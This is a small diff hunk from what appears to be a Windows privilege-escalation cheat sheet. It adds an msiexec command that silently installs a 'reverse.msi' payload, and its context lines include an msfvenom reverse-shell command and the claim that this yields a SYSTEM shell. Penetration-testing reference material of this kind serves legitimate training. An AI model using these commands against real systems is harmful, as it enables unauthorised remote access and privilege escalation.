@@ -503,6 +503,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local 
 
 Just copy it over and execute it. You should receive a reverse shell as SYSTEM.
 
+```default
+msiexec /quiet /qn /i .\reverse.msi
+```
 
 ## AutoStart Abuse
 
